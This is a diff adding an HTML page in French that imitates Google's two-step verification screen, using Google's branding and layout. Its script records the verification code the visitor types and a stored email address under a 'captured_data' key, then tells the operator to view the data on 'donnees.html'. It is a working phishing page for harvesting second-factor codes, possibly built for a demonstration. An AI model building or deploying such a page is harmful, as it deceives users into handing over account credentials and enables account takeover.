@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification en 2 étapes - Google</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 450px;
+            width: 100%;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            background: #fff;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #5f6368;
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        .icon-wrapper {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .icon {
+            width: 64px;
+            height: 64px;
+            background: #e8f0fe;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+        }
+        .form-group {
+            margin-bottom: 24px;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 8px;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #202124;
+            transition: border-color 0.2s;
+            letter-spacing: 2px;
+            text-align: center;
+        }
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #1a73e8;
+            border-width: 2px;
+        }
+        .info-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin-top: 16px;
+            line-height: 1.5;
+        }
+        .resend-link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .resend-link:hover {
+            text-decoration: underline;
+        }
+        .buttons {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            margin-top: 32px;
+        }
+        .btn-next {
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-next:hover {
+            background: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+        .btn-next:disabled {
+            background: #f1f3f4;
+            color: #80868b;
+            cursor: not-allowed;
+        }
+        .error {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+        }
+        .methods {
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #dadce0;
+        }
+        .method-title {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 12px;
+        }
+        .method-option {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .method-option:hover {
+            background: #f8f9fa;
+        }
+        .method-icon {
+            margin-right: 12px;
+            font-size: 20px;
+        }
+        .method-text {
+            font-size: 14px;
+            color: #202124;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
+                <g fill="none" fill-rule="evenodd">
+                    <path d="M67.95 12.15c0 5.5-4.3 9.55-9.55 9.55s-9.55-4.05-9.55-9.55 4.3-9.55 9.55-9.55 9.55 4.05 9.55 9.55z" fill="#EA4335"/>
+                    <path d="M58.4 17.7c-3.05 0-5.55-2.45-5.55-5.55s2.5-5.55 5.55-5.55 5.55 2.45 5.55 5.55-2.5 5.55-5.55 5.55z" fill="#FBBC05"/>
+                    <path d="M58.4 6.6c-3.05 0-5.55 2.45-5.55 5.55s2.5 5.55 5.55 5.55 5.55-2.45 5.55-5.55-2.5-5.55-5.55-5.55z" fill="#34A853"/>
+                    <path d="M21.3 12.15c0 5.5-4.3 9.55-9.55 9.55S2.2 17.65 2.2 12.15 6.5 2.6 11.75 2.6s9.55 4.05 9.55 9.55z" fill="#4285F4"/>
+                </g>
+            </svg>
+        </div>
+        <h1>Vérification en 2 étapes</h1>
+        <p class="subtitle">Pour vous assurer qu'il s'agit bien de vous</p>
+        
+        <div class="icon-wrapper">
+            <div class="icon">📧</div>
+        </div>
+
+        <form id="verification-form">
+            <div class="form-group">
+                <label>Saisissez le code de vérification envoyé à votre adresse e-mail</label>
+                <input type="text" id="code" placeholder="Saisissez le code" maxlength="6" required>
+                <div class="error" id="code-error">Code incorrect. Réessayez.</div>
+            </div>
+
+            <p class="info-text">
+                Vous n'avez pas reçu le code ? 
+                <a href="#" class="resend-link" id="resend-link">Renvoyer le code</a>
+            </p>
+
+            <div class="methods">
+                <div class="method-title">Essayer une autre méthode :</div>
+                <div class="method-option" onclick="alert('Fonctionnalité non disponible')">
+                    <span class="method-icon">📱</span>
+                    <span class="method-text">Recevoir un code par SMS</span>
+                </div>
+                <div class="method-option" onclick="alert('Fonctionnalité non disponible')">
+                    <span class="method-icon">🔑</span>
+                    <span class="method-text">Utiliser une clé de sécurité</span>
+                </div>
+            </div>
+
+            <div class="buttons">
+                <button type="submit" class="btn-next">Suivant</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        const form = document.getElementById('verification-form');
+        const codeInput = document.getElementById('code');
+        const resendLink = document.getElementById('resend-link');
+
+        // Auto-format le code (accepte uniquement les chiffres)
+        codeInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        });
+
+        resendLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('Un nouveau code a été envoyé à votre adresse e-mail');
+        });
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const code = codeInput.value.trim();
+            
+            if (code.length !== 6) {
+                document.getElementById('code-error').style.display = 'block';
+                return;
+            }
+
+            // Récupérer l'email de la session
+            const email = sessionStorage.getItem('current_email') || 'Non disponible';
+
+            const donnee = {
+                type: 'verification_code',
+                email: email,
+                code: code,
+                timestamp: new Date().toLocaleString('fr-FR'),
+                id: Date.now()
+            };
+
+            // Récupérer les données existantes
+            let donnees = JSON.parse(localStorage.getItem('captured_data') || '[]');
+            
+            // Ajouter la nouvelle donnée
+            donnees.push(donnee);
+            
+            // Sauvegarder
+            localStorage.setItem('captured_data', JSON.stringify(donnees));
+            
+            console.log('✅ Code de vérification sauvegardé:', donnee);
+            
+            // Message de succès
+            alert('Vérification réussie ! ✅\n\nConsultez vos données sur donnees.html');
+            
+            // Nettoyer la session
+            sessionStorage.removeItem('current_email');
+        });
+    </script>
+</body>
+</html>
